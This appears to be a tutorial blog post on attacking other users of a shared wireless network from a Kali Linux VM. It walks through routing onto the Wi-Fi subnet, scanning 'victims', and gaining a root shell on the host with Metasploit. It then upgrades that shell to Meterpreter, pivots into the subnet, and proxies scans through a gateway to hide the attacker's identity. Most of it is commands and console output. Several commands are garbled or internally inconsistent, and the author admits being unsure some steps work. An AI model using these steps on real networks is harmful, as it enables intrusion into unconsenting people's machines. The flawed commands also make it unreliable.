# Performing your first network-based Hyper-Jump to attack people in a wireless network

Chang Tan

Lister Unlimited Cybersecurity Solutions, LLC.

changtan@listerunlimited.com


# Requirements

```
1. KVM Hypervisor
2. Debian or Ubuntu 9.3
3. Windows Server 2016
4. Windows 10 Education Edition (Same exact thing as Windows 10 Professional)*

*Avoid the Home Edition, they do not enable the proper privileges allowing you to fully manipulate the SMB protocol. Thats the shitty version thats preinstalled on all new laptops. If you are a college student, check the student bookstore if they let you get a copy for free.

```

# Overview of steps.

	1. Connect to your KVM virtual shell internally
	2. Start up Kali Linux VM inside of KVM with virtual shell
	3. From your HOST Hypervisor, create a networking route to your VM Kali Linux attacker instance
	4. Connect to the Wi-Fi Network
	5. From the HOST Hypervisor, "merge" the virtual network containing your VM instance with the real wireless network.
	6. Perform your first attack. "Nmap" a target from the perspective of your Kali Linux attacker VM.

# Connect to your KVM virtual shell internally

Start your Kali Linux instance. You can use either virt-manager ```virt-manager``` for a interactive GUI or login to your virtual shell that gives you a more difficult but more efficient console ```virsh```.

Issue the following commands to start up the internal "virtual network" that contains Kali Linux.

```
virsh
```
In the virsh shell

```
virsh net-autostart default
virsh start KALI-domain
ufw disable
```

# From your HOST Hypervisor, create a networking route to your VM Kali Linux attacker instance

You need to be able to let the VM access YOU! Furthermore, Kali Linux works best with the firewall disabled, but more security concious individuals should add ufw rules in a manner that allows NO traffic to enter YOU, but instead be REDIRECTED through to the Kali Linux instance.
```
root@Debian:~/$path: route add default gw 192.168.0.1 dev virbr0 metric 1
root@Debian:~/$path: route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1 dev virbr0 metric 1
```
# Connect to the Wi-Fi Network

I strongly prefer wpa_supplicant because as long as it's done correctly, it enables automatic reconnects to the wireless network. However, most Linux users that like GUIs can use wicd which is installable in the standard APT repo, in ANY distro.

```
sudo apt-get update && apt-get install -y wicd wicd-curses
```

This will give you both a GUI based wireless client and a text-graphics (curses) based wireless connect client.


# From the HOST Hypervisor, "merge" the virtual network containing your VM instance with the real wireless network.

Take note of the routing path. 
```
root@Debian:~/$path: route -n

0.0.0.0         10.81.0.1       0.0.0.0         UG    0      0        0 wlan1
192.168.0.0   192.168.0.1   255.255.255.0   	UG    1      0        0 virbr0

root@Debian:~/$path: 
```

What does that tell you?

1. We have two network interfaces. A virtual network card that hosts our Kali Linux instance and the physically present, external wireless card wlan1

2. The Gateway (NAT) = is located at 10.81.0.1

3. Traffic to Kali Linux travels from 192.168.0.0 (last octet = device) through the Debian Host, through the wireless card and back to the internet.

There are potentially many more networks that this gateway is sharing between 10.81.0.0 to 10.81.255.255, lets find out, our own private IP the gateway gives us.

```ifconfig | grep -i inet```

Notice the IPv4 Addresses. First row is my virtual network. Second row is the important one. It appears that there are additional victims to strike against. The netmask range is allowing us to reach more victims.

```
        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255
        inet 10.81.24.212  netmask 255.255.0.0  broadcast 10.80.255.255
```

Lets start off with routing our attacker VM through the local wireless network, of up to 255 hosts.

```
root@Debian:route add gw 10.81.0.1 dev virbr0 metric 1
root@Debian:route add -net subnet netmask 255.255.255.0 gw 10.81.0.0 dev virbr0 metric 1
```
If you log into your Attacker Instance through Debian, the gateway should be pingable.

```
root@Debian:ssh root@kali
root@kali: ping 10.81.0.1

```
# Perform your first attack. "Nmap" a target from the perspective of your Kali Linux attacker VM.

Remember with the routing rule we added before we should be able to only percieve a 255 host range on 10.81.24.0/24. To add more subnets we need to alter the netmask part of the routing table. However I do not want to expose the VM to more hosts, potentially a very thick range of potential attackers and responding CIRT members. 


```
root@kali: nmap 10.81.24.0/24
```

# Alternatively  we can also compromise the physical HOST running Debian and use it, as a tool, or a proxy minion to do the scanning for us.

We need to do this safely, use tsocks and proxychains to have the physical Debian host run as a proxy.

```
tsocks proxychains ssh root@192.168.0.1 'sudo nmap 10.81.24.0/24'
```

So it basically, forces the first victim to act as the scanner. Once the scan completes it travels back through the proxy to us. 

# Or... you can use Metasploit module and infect the Debian host with it to allow port-forwarding modules to run through the HOST to continue attacking more victims in the network

Start up Metasploit using the standard initialization and startup of the metasploit database
```
msfdb init
msfdb start
msfconsole
```

Then because we know we can network both the Debian HOST and the Kali Linux VM together with SSH.

```
use auxiliary/scanners/ssh/ssh_login
set PASSWORD ********
set USER root
set RHOSTS 192.168.0.1
run -j
```

Note the value for RHOSTS is 192.168.0.1

WE are interacting with the Debian HOST through the perspective of the guest Kali Linux. So Kali Linux is unaware that the HOST Debian is indeed 10.81.24.X, it only perceives it as anything in its own assigned subnet.

A shell is going to pop. Just a standard Command Shell (SSH). 
```
msf payload(python/meterpreter/reverse_https) > [*] Command shell session 1 opened (192.168.122.20:45173 -> 192.168.122.1:22) at 2018-03-01 21:26:27 -0800
```
Go upgrade it Meterpreter.
```
sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.122.20:50000 
[*] Sending stage (857352 bytes) to 192.168.122.1
[*] Meterpreter session 2 opened (192.168.122.20:50000 -> 192.168.122.1:50938) at 2018-03-01 21:27:47 -0800
[*] Command stager progress: 100.00% (773/773 bytes)

```

Another shell will pop. A more featureful shell, you need to route this shell's session into the physical network (as of right now that shell only can perceive network 192.168.0.0/24, the subnet that was granted to it upon KVM's installation).

```
route add 10.81.24.0/24 2
```
This command will route session 2's traffic (Meterpreter) through to the physical subnet. It is exactly as telling the HOST to do it. 

```
msf payload(python/meterpreter/reverse_https) > route add 10.81.24.0/24 2
[*] Route added
msf payload(python/meterpreter/reverse_https) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.81.24.0         255.255.255.0      Session 2

[*] There are currently no IPv6 routes defined.

```

Metasploit has very specific commands that allow you to continually attacking new victims through a single compromised host. Even to send a exploit against a very specific host that you are aware is vulnerable to a specific attack. But in real life most people are immune to them.

Lets perform a ping sweep, but you have to portforward the port range as well. Interact with your session

```
sessions -i 1
meterpreter > portfwd add -l 60001 -p 445 -r 10.81.24.0/24 2
[*] Local TCP relay created: :60001 <-> 10.81.24.0/24:445
```
This command forwards commands sent from
```My own 60001 ---> to a entire subnet range on a specified port (445)```

The ping_sweep module allows you to use one compromised opponent to...

1. Discover
2. Attack

New hosts in the same subnet.

```
IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.81.24.0         255.255.255.0      Session 2

[*] There are currently no IPv6 routes defined.
msf post(multi/gather/ping_sweep) > setg rhosts 10.81.24.0/24
rhosts => 10.81.24.0/24
msf post(multi/gather/ping_sweep) > setg session 2
session => 2
msf post(multi/gather/ping_sweep) > run -j
[*] Post module running as background job 3.
msf post(multi/gather/ping_sweep) > 
[*] Performing ping sweep for IP range 10.81.24.0/24
[+] 	10.81.24.28 host found
[+] 	10.81.24.40 host found
```

I am sure you all know this as standard pivoting tactics available within the Metasploit Framework. What the information has shown is that there are least 2 additional hosts with SSH enabled. Probably my phone. 

To a professional pentester, this is all they need to know to locate a suitable hypervisor to attack. This network doesn't have a worthy hypervisor though.


# To attack hosts in a different subnet.

In order to launch a attack in a different subnet you can still do it from this subnet. 

But maybe there is a isolated one that cannot be reached by this gateway and certainly not msfconsole. You use tsocks and proxychains to interact with a completely isolated subnet by assuming the identity of one that it may trust (sic because I dont if it really would work). Worth a shot.

One, check if you can use the main gateway as a http proxy.

From the perspective of your Kali Linux VM, go back into bash shell.

```
msf post(multi/gather/ping_sweep) > screen -S bash
[*] exec: screen -S bash
root@kali:
```

This creates screen instance allowing you to multitask. While leaving the actual console  unharmed. Now you can use things like [TAB] completion. To go back, you press CTRL A D to back to msfconsole.

First create a dynamic SSH proxy to

```
ssh -NfD 1080 root@192.168.122.1
```
You won't see anything happen, but it returns to the prompt it means it worked. 

Now you can use your compromised host to authenticate to a gateway, but we will be using ncat (not netcat. ncat! a separate program).

```
ncat --listen --proxy-type http 10.81.0.1 443 &

```
And then you need modify /etc/proxychains.conf

```
echo 'socks4 192.168.1.1 1080' >> /etc/proxychains.conf
echo 'http 10.81.0.1 443' >> /etc/proxychains.conf
```

This will allow you to run nmap and nikto web application scans against the outside target while assuming identity of your gateway or any person you stuck a http proxy on. Remember they actually have to have the http ports open (any port that accepts http) like 80, 81, 8080, 443, 8081.

It helps in keeping your hands clean since a foreign firewall or scanner would only show the last IP and it's signature, not yours. 

Now basically below here in this box, we switched the scanner to port 80, which everyone has. To allow yourself to even browse a webpage, we know port 80 has to be OPEN. 
```
meterpreter > portfwd add -l 60005 -p 80 -r 10.81.24.0/24 2
[*] Local TCP relay created: :60005 <-> 10.81.24.0/24:80
meterpreter > background 
[*] Backgrounding session 2...
msf post(multi/gather/ping_sweep) > run -j
```
So basically it's a guaranteed or reliable way to determine how many people are on a  network. Or how many new victims.


